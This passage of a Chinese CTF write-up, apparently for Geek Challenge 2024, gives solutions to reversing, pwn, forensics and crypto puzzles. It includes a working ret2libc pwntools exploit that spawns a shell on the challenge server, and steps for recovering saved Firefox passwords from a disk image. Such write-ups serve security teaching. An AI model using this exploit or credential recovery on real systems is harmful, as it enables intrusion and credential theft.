class="line"><span class="keyword">def</span> <span class="title function_">rol4</span>(<span class="params">value, shift=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; shift) &amp; <span class="number">0xFFFFFFFF</span>) | (value &gt;&gt; (<span class="number">32</span> - shift))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror4</span>(<span class="params">value, shift=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">return</span> ((value &gt;&gt; shift) | (value &lt;&lt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = ((k[<span class="number">0</span>]^k[<span class="number">1</span>])&amp; <span class="number">0xFF</span>) + <span class="number">0x98765432</span></span><br><span class="line">    x = delta * <span class="number">32</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x56789ABC</span>, <span class="number">0x6789ABCD</span>, <span class="number">0x789ABCDE</span>, <span class="number">0x89ABCDEF</span>]</span><br><span class="line">key = [rol4(k) <span class="keyword">for</span> k <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">encrypted = [<span class="number">0x1F85A965</span>,<span class="number">0xEEC063EC</span>,<span class="number">0x5BF1D0B6</span>,<span class="number">0xF2FDE7B0</span>,<span class="number">0xAA38809A</span>,<span class="number">0x670772E9</span>,<span class="number">0x360D24B9</span>,<span class="number">0xE98C688C</span>]</span><br><span class="line"></span><br><span class="line">final = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)//<span class="number">2</span>-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    now = decrypt(encrypted[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">    key[i] = ror4(key[i])</span><br><span class="line">    final = long_to_bytes(now[<span class="number">0</span>])[::-<span class="number">1</span>] + long_to_bytes(now[<span class="number">1</span>])[::-<span class="number">1</span>] + final</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;DH_likes_flower_and_tea!!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="玩就行了"><a href="#玩就行了" class="headerlink" title="玩就行了"></a>玩就行了</h3><blockquote><p>师傅们思来想去想要给大家搞点乐趣，快来和三叶草娘一起玩游戏吧~</p><p>链接: <a href="https://pan.baidu.com/s/1gXKEZJbRhyEfO6BHHQ1bLw?pwd=game">https://pan.baidu.com/s/1gXKEZJbRhyEfO6BHHQ1bLw?pwd=game</a> 提取码: game</p></blockquote><p>Unity游戏，IlSpy 分析 <code>\玩就行了\玩就行了_BackUpThisFolder_ButDontShipItWithYourGame\Managed</code>，关键代码：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SYC</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> hexString = LoadHexDataFromResources(<span class="string">&quot;output&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(hexString))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> filePath = Path.Combine(Directory.GetParent(Application.dataPath).FullName, <span class="string">&quot;Data.txt&quot;</span>);</span><br><span class="line">        <span class="built_in">string</span> directoryPath = Path.GetDirectoryName(filePath);</span><br><span class="line">        <span class="keyword">if</span> (!Directory.Exists(directoryPath))</span><br><span class="line">        &#123;</span><br><span class="line">            Directory.CreateDirectory(directoryPath);</span><br><span class="line">        &#125;</span><br><span class="line">        File.WriteAllText(filePath, hexString);</span><br><span class="line">        Debug.Log(<span class="string">&quot;File saved at: &quot;</span> + filePath);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Debug.LogError(<span class="string">&quot;Failed to load hex data from resources.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用AssetStudio加载资源文件 <code>\玩就行了\玩就行了_Data\resources.assets</code>，</p><p>导出output内容，16进制转字节，保存为exe文件，逆向找到关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">117</span>]; <span class="comment">// [rsp+2Bh] [rbp-55h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">108</span>]; <span class="comment">// [rsp+A0h] [rbp+20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+10Ch] [rbp+8Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_14000181E(argc, argv, envp);</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;GEEK&quot;</span>);</span><br><span class="line">  sub_1400013B4(<span class="string">&quot;WOW~~Niceeeee to see you here!!!\n&quot;</span>);</span><br><span class="line">  sub_1400013B4(<span class="string">&quot;Welcome to GEEK Challenge!!!!!\n&quot;</span>);</span><br><span class="line">  sub_1400013B4(<span class="string">&quot;Please input your answer~\n&quot;</span>);</span><br><span class="line">  sub_140001360(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  sub_14000144B(Str, <span class="number">20</span>i64);</span><br><span class="line">  sub_140001596(Str, v4);</span><br><span class="line">  sub_14000161C(Str, &amp;v4[<span class="number">5</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v4[<span class="number">5</span>], <span class="string">&quot;0A161230300C2D0A2B303D2428233005242C2D26182206233E097F133A&quot;</span>) )</span><br><span class="line">    sub_1400013B4(<span class="string">&quot;G00D!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_1400013B4(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  sub_1400013B4(<span class="string">&quot;\nPress any key to continue...&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析加密逻辑为 ROT20+异或GEEK，解密逻辑：异或GEEK+ROT6，得到flag：<code>SYC&#123;cOnGraduulaTions_mIneR:D&#125;</code>。</p><p>​    </p><h3 id="CPP-flower"><a href="#CPP-flower" class="headerlink" title="CPP_flower"></a>CPP_flower</h3><blockquote><p>栀子花开啊开~</p></blockquote><p>nop掉几种花指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. jz xxx; jnz xxx</span><br><span class="line">2. call near ptr xxx</span><br><span class="line">3. jump</span><br><span class="line">4. push xxx retn</span><br></pre></td></tr></table></figure><p>大概还原出这样的伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_559D10</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [esp-8h] [ebp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">41</span>]; <span class="comment">// [esp+2Ch] [ebp-208h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+104h] [ebp-130h]</span></span><br><span class="line">  <span class="type">int</span> Buf2[<span class="number">52</span>]; <span class="comment">// [esp+110h] [ebp-124h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1E0h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">36</span>]; <span class="comment">// [esp+1ECh] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">20</span>]; <span class="comment">// [esp+210h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+230h] [ebp-4h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+234h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_551127(<span class="number">0x10</span>u);</span><br><span class="line">  sub_5511C2(v11);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  srand(<span class="number">0x7DE9</span>u);</span><br><span class="line">  sub_551519();</span><br><span class="line">  sub_5514B0(v10);</span><br><span class="line">  LOBYTE(v12) = <span class="number">1</span>;</span><br><span class="line">  v0 = sub_55138E(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;give your input:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, sub_551073);</span><br><span class="line">  sub_551519();</span><br><span class="line">  sub_5513F7(<span class="built_in">std</span>::<span class="built_in">cin</span>, v10);</span><br><span class="line">  <span class="keyword">if</span> ( sub_55181B(v10) == dword_566004 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_566004; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      rand();</span><br><span class="line">      v6[<span class="number">0</span>] = sub_551519() % <span class="number">255</span>;</span><br><span class="line">      sub_5512E4(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_566004; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_55128A(i);</span><br><span class="line">      v7 = *v2 ^ *sub_551113(i);</span><br><span class="line">      Buf2[i] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !j_memcmp(&amp;unk_562C30, Buf2, <span class="number">4</span> * dword_566004) )</span><br><span class="line">      v3 = sub_55138E(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;you get it&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = sub_55138E(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, sub_551073);</span><br><span class="line">    sub_551519();</span><br><span class="line">    LOBYTE(v12) = <span class="number">0</span>;</span><br><span class="line">    sub_551438(v10);</span><br><span class="line">    v12 = <span class="number">-1</span>;</span><br><span class="line">    sub_551726(v11);</span><br><span class="line">    LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    LOBYTE(v12) = <span class="number">0</span>;</span><br><span class="line">    sub_551438(v10);</span><br><span class="line">    v12 = <span class="number">-1</span>;</span><br><span class="line">    sub_551726(v11);</span><br><span class="line">    LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = v1;</span><br><span class="line">  sub_551456(&amp;savedregs, &amp;loc_55A008);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑为：先 <code>srand(0x7DE9)</code>，再将输入的每个字符异或 <code>rand()%255</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> c[<span class="number">50</span>]=&#123;<span class="number">62</span>, <span class="number">152</span>, <span class="number">235</span>, <span class="number">38</span>, <span class="number">37</span>, <span class="number">142</span>, <span class="number">37</span>, <span class="number">229</span>, <span class="number">134</span>, <span class="number">200</span>, <span class="number">63</span>, <span class="number">152</span>, <span class="number">200</span>, <span class="number">222</span>, <span class="number">82</span>, <span class="number">68</span>, <span class="number">160</span>, <span class="number">203</span>, <span class="number">43</span>, <span class="number">42</span>, <span class="number">60</span>, <span class="number">170</span>, <span class="number">190</span>, <span class="number">203</span>, <span class="number">136</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">109</span>, <span class="number">217</span>, <span class="number">148</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">82</span>, <span class="number">49</span>, <span class="number">89</span>, <span class="number">254</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">232</span>, <span class="number">208</span>, <span class="number">58</span>, <span class="number">156</span>, <span class="number">6</span>, <span class="number">94</span>, <span class="number">37</span>, <span class="number">90</span>, <span class="number">228</span>, <span class="number">34</span>, <span class="number">161</span>, <span class="number">197</span>&#125;;</span><br><span class="line">    srand(<span class="number">0x7DE9</span>u);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(rand()%<span class="number">255</span>)^c[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SYC&#123;Y0u_c@n_3nJoy_yhe_Flow3r_anytime_and_anywhere&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="su"><a href="#su" class="headerlink" title="su~~~~"></a>su~~~~</h3><blockquote><p>C罗？su~~~~</p></blockquote><p>直接用ret2libc可解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">27612</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;su_____/csu&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;su_____/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line">pop_rdi=<span class="number">0x400903</span></span><br><span class="line">ret=<span class="number">0x4005d6</span></span><br><span class="line">back=elf.sym.writesomething</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;exit.\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pl=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>),pop_rdi,puts_got,puts_plt,back])</span><br><span class="line">r.send(pl)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;puts_addr:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;libc_base:x&#125;</span>&#x27;</span>)</span><br><span class="line">system=libc_base+libc.sym.system</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pl=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>),ret,pop_rdi,binsh,system,back])</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><blockquote><p>听说爱冒险的lhRaMk7师傅最近换了个浏览器，似乎藏了一些有用的东西…</p><p>下载链接: <a href="https://pan.baidu.com/s/1p_90wi798gG7wuREGQkhvw?pwd=game">https://pan.baidu.com/s/1p_90wi798gG7wuREGQkhvw?pwd=game</a> 提取码: game</p></blockquote><p><code>Geek2024.ad1</code> 文件，文件头为 <code>ADSEGMENTEDFILE</code>，查为AccessData逻辑镜像文件，使用AccessData FTK Imager打开。</p><p>提示浏览器，<code>Public/Desktop</code> 目录下有Firefox和Edge的快捷方式，<code>Geek2024/Document</code> 目录下有 <code>Adventure.txt</code>。</p><p>base64隐写得到：<code>100011111001011100101110101101100100110000011001001101001010011111100111000110100000</code>，7bits转字符：<code>Geek2024Syc</code>。</p><p>寻找火狐浏览器相关文件，在 <code>Geek2024/AppData/Roaming/Mozilla/Firefox/Profiles/uf11qmty.default</code> 中，尝试用firepwd工具还原：<br><code>python firepwd.py -p Geek2024Syc -d uf11qmty.default</code></p><p>无有效信息，参考：<a href="https://blog.csdn.net/weixin_74292969/article/details/136544419">[GKCTF 2021]FireFox Forensics1 关于 Firefox的网站密码存储</a></p><p>下载安装火狐浏览器，新建密码，Win+R，输入 <code>%AppData%\Mozilla\Firefox\Profiles</code>，进入第一个文件夹，替换取出的 <code>key4.db</code> 和 <code>logins.json</code>，重新打开火狐浏览器，进入密码界面，输入主密码 <code>Geek2024Syc</code>，显示密码，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网址</span><br><span class="line">http://geek2024.welc0me.you</span><br><span class="line">用户名</span><br><span class="line">Geek2024</span><br><span class="line">密码</span><br><span class="line">SYC&#123;F1ref0x_F0r3ns1cs_Mas7er&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ecc"><a href="#ecc" class="headerlink" title="ecc"></a>ecc</h3><blockquote><p>椭圆曲线加密，flag前缀为SYC{xx}</p></blockquote><p>$M=C_1-kC_2$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">p = <span class="number">93202687891394085633786409619308940289806301885603002539703165565954917915237</span></span><br><span class="line">a = <span class="number">93822086754590882682502837744000915992590989006575416134628106376590825652793</span></span><br><span class="line">b = <span class="number">80546187587527518012258369984400999843218609481640396827119274116524742672463</span></span><br><span class="line">F = GF(p)</span><br><span class="line">E = EllipticCurve(F,[a,b])</span><br><span class="line"></span><br><span class="line">k = <span class="number">58946963503925758614502522844777257459612909354227999110879446485128547020161</span></span><br><span class="line">c1 = E(<span class="number">40485287784577105052142632380297282223290388901294496494726004092953216846111</span>, <span class="number">81688798450940847410572480357702533480504451191937977779652402489509511335169</span>)</span><br><span class="line">c2 = E(<span class="number">51588540344302003527882762117190244240363885481651104291377049503085003152858</span>, <span class="number">77333747801859674540077067783932976850711668089918703995609977466893496793359</span>)</span><br><span class="line">cipher_left = <span class="number">34210996654599605871773958201517275601830496965429751344560373676881990711573</span></span><br><span class="line">cipher_right = <span class="number">62166121351090454316858010748966403510891793374784456622783974987056684617905</span></span><br><span class="line"></span><br><span class="line">m = (c1-k*c2).xy()</span><br><span class="line">m1 = F(cipher_left)/m[<span class="number">0</span>]</span><br><span class="line">m2 = F(cipher_right)/m[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:])+<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m2)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;Ecc$is!sO@HaRd&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><blockquote><p>coppersmith，flag前缀为SYC{xx}</p></blockquote><p>已知m高位，coppersmith求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span></span><br><span class="line">c = <span class="number">9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span></span><br><span class="line">h = <span class="number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">mh=(h+<span class="number">2023</span>)*inverse_mod(<span class="number">2024</span>,n)%n</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mh + x)^e - c</span><br><span class="line">root=f.small_roots(X=<span class="number">2</span>^<span class="number">150</span>, beta=<span class="number">1</span>)</span><br><span class="line">m = mh+root[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;crypto_is_very_interesting_why_dont_you_join_us&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="RnoCRT"><a href="#RnoCRT" class="headerlink" title="RnoCRT"></a>RnoCRT</h3><blockquote><p>Also gcd!=1</p></blockquote><p>crt+sha256爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m=[<span class="number">207867980504656835313307696396607264603</span>, <span class="number">245036212212570610987366430554968489325</span>, <span class="number">270836744824069537438646110613439698666</span>, <span class="number">319275775495422875474878625752594133023</span>, <span class="number">254268823435329877199449670714528712873</span>, <span class="number">213093607196415232366564484229844568444</span>, <span class="number">246921085368773491003187313772615702950</span>]</span><br><span class="line">c=[<span class="number">150031581047390726903711035932621949276</span>, <span class="number">21260202376534810598778595491323328519</span>, <span class="number">144049733622518360270048059408969512643</span>, <span class="number">236920143187836025924037873968303507493</span>, <span class="number">99781504248790469459151935530031893836</span>, <span class="number">69236016568483424294966410179787943383</span>, <span class="number">20613188366058016717435734248097940419</span>]</span><br><span class="line">x=crt(c,m)</span><br><span class="line"></span><br><span class="line">l=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span 